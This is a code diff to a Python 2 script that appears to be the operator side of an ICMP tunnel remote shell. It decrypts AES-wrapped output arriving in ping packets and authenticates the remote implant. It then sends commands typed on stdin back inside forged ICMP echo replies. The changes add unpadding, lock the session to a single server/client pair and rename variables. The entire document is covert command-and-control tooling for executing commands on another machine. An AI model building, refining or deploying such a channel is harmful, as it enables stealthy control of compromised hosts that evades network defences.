@@ -48,6 +48,7 @@ def set_non_blocking(fd):
 
 
 class Crypt(object):
+   
     def __init__(self, key):
         super(Crypt, self).__init__()
         sha = hashlib.sha256()
@@ -57,6 +58,9 @@ class Crypt(object):
     def pad(self, s):
         BS = AES.block_size
         return s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
+
+    def unpad(self, s):
+        return s[0:-ord(s[-1])]
 
     def encrypt(self, buf):
         raw = self.pad(buf)
@@ -68,7 +72,8 @@ class Crypt(object):
         iv = buf[0:AES.block_size]
         cipher = buf[AES.block_size:]
         aes = AES.new(self.key, AES.MODE_CBC, iv)
-        return aes.decrypt(cipher)
+        raw = aes.decrypt(cipher)
+        return self.unpad(raw)
 
 
 def auth_code(uid):
@@ -128,13 +133,11 @@ def main():
     encryptor = Crypt(PASSWORD)
 
     #
-    server = None
-
+    server = client = None
     while True:
-        cmd = ''
-
+        reply = ''
         # Wait for incoming replies
-        if sock in select.select([ sock ], [], [])[0]:
+        if sock in select.select([sock], [], [])[0]:
             buf = sock.recv(4096)
 
             if not len(buf):
@@ -149,6 +152,9 @@ def main():
             # imcoming command
             incoming_src, incoming_dst = ippacket.get_ip_src(), ippacket.get_ip_dst()
             if icmppacket.get_icmp_type() == 8:
+                if (server and incoming_src <> server) or (client and incoming_dst <> client):
+                    continue
+
                 # Get identifier and sequence number
                 icmp_id = icmppacket.get_icmp_id()
                 seq_id = icmppacket.get_icmp_seq()
@@ -157,31 +163,35 @@ def main():
                 try:
                     msg = encryptor.decrypt(data)
 
-                    if not server and msg.startswith(MSG_ONLINE):
+                    if msg.startswith(MSG_ONLINE):
                         uid = msg[len(MSG_ONLINE):]
-                        cmd = auth_code(uid)
-
+                        code = auth_code(uid)
+                        if code:
+                            server = incoming_src
+                            client = incoming_dst
+                            print "Server: %s" % server
+                            reply = code
                     else:
                         sys.stdout.write(msg)
-
+                except:
                     pass
 
-                if not cmd:
+                if not reply:
                     # Parse command from standard input
                     try:
-                        cmd = sys.stdin.readline()
+                        reply = sys.stdin.readline()
                     except:
                         pass
 
-                if cmd == 'exit\n':
-                    return
+                    if reply == 'exit\n':
+                        return
 
                 # Set sequence number and identifier
                 icmp.set_icmp_id(icmp_id)
                 icmp.set_icmp_seq(seq_id)
 
                 # Include the command as data inside the ICMP packet
-                data = encryptor.encrypt(cmd)
+                data = encryptor.encrypt(reply)
                 icmp.contains(ImpactPacket.Data(data))
 
                 # Calculate its checksum
@@ -189,12 +199,12 @@ def main():
                 icmp.auto_checksum = 1
 
                 # Have the IP packet contain the ICMP packet (along with its payload)
-                ip.set_ip_src(src)
-                ip.set_ip_dst(dst)
+                ip.set_ip_src(client)
+                ip.set_ip_dst(server)
                 ip.contains(icmp)
 
                 # Send it to the target host
-                sock.sendto(ip.get_packet(), (dst, 0))
+                sock.sendto(ip.get_packet(), (server, 0))
 
 if __name__ == '__main__':
     main()
